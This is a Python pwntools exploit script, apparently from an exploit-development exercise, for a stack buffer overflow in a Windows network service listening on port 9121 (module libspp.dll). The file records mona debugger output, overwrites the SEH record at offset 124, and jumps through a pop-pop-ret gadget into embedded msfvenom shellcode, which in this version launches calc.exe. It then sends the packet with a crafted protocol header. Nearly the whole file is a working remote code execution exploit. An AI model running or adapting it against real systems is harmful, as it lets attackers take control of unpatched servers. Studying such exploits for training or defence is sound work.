#!/usr/bin/python3
from pwn import remote, p32, asm

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 2
Start of chain (TEB FS:[0]) : 0x01c4fe0c
Address     Next SEH    Handler
-------     --------    -------
0x01c4ff44  0x65413165  0x33654132  (record smashed at offset 124)

[+] Command used:
!py mona seh -m libspp.dll
[+] Results :
0x10043ad7 |   0x10043ad7 : pop esi # pop ecx # ret |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (libspp.dll)
"""

offset = 124
junk = b"A" * offset

nseh = asm("jmp $+8").ljust(4, b"A")
seh = p32(0x10043ad7)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\xf4\xec\x83\xc2\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x08\x04\x01\xc2\xf0\xd5\x66\x4a"
shellcode += b"\x15\xe4\xa6\x28\x5e\x57\x17\x3a\x32\x54\xdc"
shellcode += b"\x6e\xa6\xef\x90\xa6\xc9\x58\x1e\x91\xe4\x59"
shellcode += b"\x33\xe1\x67\xda\x4e\x36\x47\xe3\x80\x4b\x86"
shellcode += b"\x24\xfc\xa6\xda\xfd\x8a\x15\xca\x8a\xc7\xa5"
shellcode += b"\x61\xc0\xc6\xad\x96\x91\xe9\x9c\x09\xa9\xb3"
shellcode += b"\x3e\xa8\x7e\xc8\x76\xb2\x63\xf5\xc1\x49\x57"
shellcode += b"\x81\xd3\x9b\xa9\x6a\x7f\xe2\x05\x99\x81\x23"
shellcode += b"\xa1\x42\xf4\x5d\xd1\xff\x0f\x9a\xab\xdb\x9a"
shellcode += b"\x38\x0b\xaf\x3d\xe4\xad\x7c\xdb\x6f\xa1\xc9"
shellcode += b"\xaf\x37\xa6\xcc\x7c\x4c\xd2\x45\x83\x82\x52"
shellcode += b"\x1d\xa0\x06\x3e\xc5\xc9\x1f\x9a\xa8\xf6\x7f"
shellcode += b"\x45\x14\x53\xf4\x68\x41\xee\x57\xe7\x94\x7c"
shellcode += b"\xe2\x45\x96\x7e\xec\xf9\xff\x4f\x67\x96\x78"
shellcode += b"\x50\xa2\xd2\x77\x1a\xee\x73\x10\xc3\x7b\xc6"
shellcode += b"\x7d\xf4\x56\x05\x78\x77\x52\xf6\x7f\x67\x17"
shellcode += b"\xf3\xc4\x2f\xc4\x89\x55\xda\xea\x3e\x55\xcf"
shellcode += b"\x89\xa1\xc5\x93\x63\x47\x6e\x31\x7b\x87\x8e"
shellcode += b"\xb9\x7b\x87\x8e\xb9"

payload  = b""
payload += junk
payload += nseh + seh
payload += asm("add sp, 0x6a3")
payload += asm("jmp esp")
payload += shellcode
payload += b"B" * (500 - len(payload))

header  = b""
header += p32(0xabba1975)
header += p32(0x3)
header += p32(0x1)
header += p32(len(payload))
header += p32(len(payload))
header += p32(payload[-1])

content = header + payload

shell = remote("Windows", 9121)
shell.sendline(content)
